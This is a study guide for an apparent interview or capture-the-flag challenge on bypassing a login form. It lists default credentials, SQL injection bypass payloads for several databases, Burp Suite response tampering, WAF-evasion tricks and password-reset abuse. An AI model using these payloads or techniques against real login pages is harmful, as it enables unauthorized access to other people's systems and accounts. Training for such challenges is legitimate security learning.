# Challenge 3: User Login Bypass

> **Difficulty:** 🟢 EASY | **Success Ratio:** 100%
> **Goal:** Bypass a login form to gain unauthorized access.

---

## What They Test

Can you bypass a login form using SQL injection, default credentials, response manipulation, or other techniques to access the application without valid credentials?

---

## Methodology (Follow This Order)

### Step 1: View Page Source First

Before anything else, always view the page source:

```
1. Right-click → View Page Source (Ctrl+U)
2. Check for:
   - HTML comments with credentials: <!-- admin:password123 -->
   - Hidden form fields with hints
   - JavaScript validation logic
   - Hardcoded credentials in JS files
   - API endpoints in AJAX calls
```

### Step 2: Try Default Credentials

```
admin:admin
admin:password
admin:password123
admin:admin123
admin:12345
admin:123456
administrator:administrator
root:root
root:toor
test:test
user:user
guest:guest
admin:changeme
admin:letmein
admin:welcome
admin:Password1
```

### Step 3: SQL Injection Login Bypass

#### Basic Payloads (Try These First)
```sql
-- In USERNAME field:
admin' --
admin' #
admin'/*
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 --
' OR 1=1 #
') OR ('1'='1' --
') OR 1=1 --
admin' OR '1'='1
admin' OR '1'='1' --
admin' OR '1'='1' #

-- PASSWORD field can be anything when using -- (comment)
```

#### Intermediate Payloads
```sql
-- Double query bypass
admin'; --
' UNION SELECT 1,'admin','password' --
' UNION SELECT NULL,NULL,NULL --

-- Without spaces (if spaces are filtered)
'OR'1'='1'--
'||'1'='1'--    (Oracle)

-- Without quotes
admin\' --
1\' or 1=1 --

-- Using OR on password field
Username: admin
Password: ' OR '1'='1
```

#### Database-Specific Payloads
```sql
-- MySQL
admin' OR 1=1 -- -
admin' OR 1=1 #
' OR 'x'='x' -- -

-- PostgreSQL
admin' OR 1=1 --
'; SELECT pg_sleep(5) --

-- MSSQL
admin' OR 1=1 --
'; WAITFOR DELAY '0:0:5' --
' UNION SELECT NULL,NULL,NULL --

-- Oracle
admin' OR 1=1 --
' UNION SELECT NULL FROM dual --

-- SQLite
admin' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
```

### Step 4: Response Manipulation (Burp Suite)

```
1. Open Burp Suite → Proxy → Intercept On
2. Attempt login with any credentials
3. Right-click the request → "Do intercept" → "Response to this request"
4. Forward the request
5. When you see the response, look for:
   - "success": false → change to "success": true
   - "authenticated": 0 → change to "authenticated": 1
   - "role": "guest" → change to "role": "admin"
   - 302 redirect to /login → change to redirect to /dashboard
   - Status 401 → change to 200
6. Forward the modified response
```

### Step 5: Authentication Logic Bypass

```
# Try accessing protected pages directly (skip login)
https://target.com/dashboard
https://target.com/admin
https://target.com/home
https://target.com/panel
https://target.com/profile

# Try removing authentication cookies and navigating
# Some apps only check auth on the login page

# Try changing HTTP method
# If POST /login is protected, try GET /login with params

# Check for backup login pages
https://target.com/login2
https://target.com/admin-login
https://target.com/old-login
```

### Step 6: Password Reset Abuse

```
# Check if password reset sends a predictable token
# Check if you can reset admin's password with your email
# Check if the reset link is guessable

# Some reset flows:
1. Ask for reset → get token in URL
2. Token might be: MD5(email), base64(timestamp), sequential number
3. Predict or brute force the token
```

---

## Burp Suite Workflow for Login Bypass

```
Step 1: Configure browser proxy → 127.0.0.1:8080
Step 2: Navigate to login page
Step 3: Turn on Intercept
Step 4: Submit login form
Step 5: In intercepted request:
        - Modify username with SQLi payload
        - Modify hidden fields
        - Add/change cookies
Step 6: Forward → check response
Step 7: If blocked, try response manipulation
```

---

## Common Pitfalls & Solutions

| Problem                          | Solution                                                                      |
| -------------------------------- | ----------------------------------------------------------------------------- |
| Single quotes are escaped        | Try double quotes or backslash: `admin" OR "1"="1` or `admin\' OR 1=1 --`     |
| WAF blocks `OR` keyword          | Try `                                                                         |  | ` operator or `OR` with different casing |
| Spaces are filtered              | Use `/**/` or `%09` (tab) instead of spaces                                   |
| `--` comment doesn't work        | Try `#` or `/*` for MySQL                                                     |
| Login uses parameterized queries | SQLi won't work — try default creds or response manipulation                  |
| CAPTCHA on login                 | Check if CAPTCHA is validated server-side; intercept and remove CAPTCHA field |

---

## Quick Decision Tree

```
Login Page Found
├── View Source → credentials in comments? → USE THEM
├── Try default creds (admin:admin, etc.) → work? → DONE
├── Try SQLi payloads in username → bypass? → DONE
├── Intercept in Burp → manipulate response → bypass? → DONE
├── Navigate directly to /dashboard → accessible? → DONE
└── Check password reset → exploitable? → DONE
```

---

## Tips for the Interview

1. **Don't jump to SQLi immediately** — check source code and try default creds first
2. **Always use Burp Suite** — intercepting requests/responses is essential
3. **Try both username AND password fields** for SQLi — sometimes only one is vulnerable
4. **Comment out the rest of the query** with `--` or `#` after your payload
5. **If one SQLi payload fails, try others** — different databases use different syntax
6. **Response manipulation is often the intended solution** for easier challenges
